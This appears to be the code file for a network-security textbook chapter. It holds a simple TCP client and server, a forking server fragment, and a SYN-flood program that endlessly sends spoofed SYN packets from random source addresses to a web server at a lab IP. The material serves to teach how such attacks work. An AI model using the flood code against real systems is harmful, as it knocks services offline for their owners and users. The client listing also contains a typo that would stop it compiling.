/******************************
 * Code in Chapter 13
 ******************************/



/**********************************************
 * Listing 13.1: TCP Client Program
 **********************************************/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

int main()
{
  // Step 1: Create a socket
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);       

  // Step 2: Set the destination information
  struct sockaddr_in dest;
  memset(&dest, 0, sizeof(struct sockaddr_in));        
  dest.sin_family = AF_INET;                        
  dest.sin_addr.s_addr = inet_addr("10.0.2.17");
  dest.sin_port = htons(9090);                     

  // Step 3: Connect to the server
  connect(sockfd, (struct sockaddr *)&dest,       
          sizeof(struct sockaddr_in));

  // Step 4: Send data to the server
  char *buffer1 = "Hello Server!\n";
  char *buffer2 = "Hello Again!\n";
  write(sockfd, buffer1, strlen(buffer1));       

  write(sockfd, buffer2, strlen(buffer2));

  // Step 5: Close the connection
  close(sockefd);                               

  return 0;
}



/**********************************************
 * Listing 13.2: TCP Server Program
 **********************************************/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

int main()
{
  int sockfd, newsockfd;
  struct sockaddr_in my_addr, client_addr;
  char buffer[100];

  // Step 1: Create a socket 
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  // Step 2: Bind to a port number
  memset(&my_addr, 0, sizeof(struct sockaddr_in));
  my_addr.sin_family = AF_INET;
  my_addr.sin_port = htons(9090);
  bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr_in));

  // Step 3: Listen for connections
  listen(sockfd, 5);

  // Step 4: Accept a connection request
  int client_len = sizeof(client_addr);
  newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);

  // Step 5: Read data from the connection
  memset(buffer, 0, sizeof(buffer));
  int len = read(newsockfd, buffer, 100);
  printf("Received %d bytes: %s", len, buffer);

  // Step 6: Close the connection
  close(newsockfd); close(sockfd);

  return 0;
}


/**********************************************
 * Code on Page 231 (Section 13.1.2)
 **********************************************/

  // Listen for connections
  listen(sockfd, 5);

  int client_len = sizeof(client_addr);
  while (1) {
    newsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);

    if (fork() == 0) { // The child process            
       close (sockfd); 

       // Read data.  
       memset(buffer, 0, sizeof(buffer));
       int len = read(newsockfd, buffer, 100);
       printf("Received %d bytes.\n%s\n", len, buffer);

       close (newsockfd);
       return 0;
    } else {  // The parent process                   
       close (newsockfd); 
    }
  }


/**********************************************
 * Listing 13.3: Spoofing SYN packets
 **********************************************/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include "myheader.h"

#define DEST_IP  "10.0.2.17"
#define DEST_PORT  80  // Attack the web server 

/******************************************************************
  Spoof a TCP SYN packet. 
*******************************************************************/
int main() {
   char buffer[PACKET_LEN];
   struct ipheader *ip = (struct ipheader *) buffer;
   struct tcpheader *tcp = (struct tcpheader *) (buffer + 
                                   sizeof(struct ipheader));

   srand(time(0)); // Initialize the seed for random # generation. 
   while (1) {
     memset(buffer, 0, PACKET_LEN);
     /*********************************************************
        Step 1: Fill in the TCP header.
     ********************************************************/
     tcp->tcp_sport = rand(); // Use random source port
     tcp->tcp_dport = htons(DEST_PORT);
     tcp->tcp_seq   = rand(); // Use random sequence #
     tcp->tcp_offx2 = 0x50;
     tcp->tcp_flags = TH_SYN; // Enable the SYN bit
     tcp->tcp_win   = htons(20000);
     tcp->tcp_sum   = 0;

     /*********************************************************
        Step 2: Fill in the IP header.
     ********************************************************/
     ip->iph_ver = 4;   // Version (IPV4)
     ip->iph_ihl = 5;   // Header length
     ip->iph_ttl = 50;  // Time to live 
     ip->iph_sourceip.s_addr = rand(); // Use a random IP address 
     ip->iph_destip.s_addr = inet_addr(DEST_IP);
     ip->iph_protocol = IPPROTO_TCP; // The value is 6.
     ip->iph_len = htons(sizeof(struct ipheader) + 
                         sizeof(struct tcpheader));

     // Calculate tcp checksum 
     tcp->tcp_sum = calculate_tcp_checksum(ip);

     /*********************************************************
       Step 3: Finally, send the spoofed packet
     ********************************************************/
     send_raw_ip_packet(ip);
   }

   return 0;
}

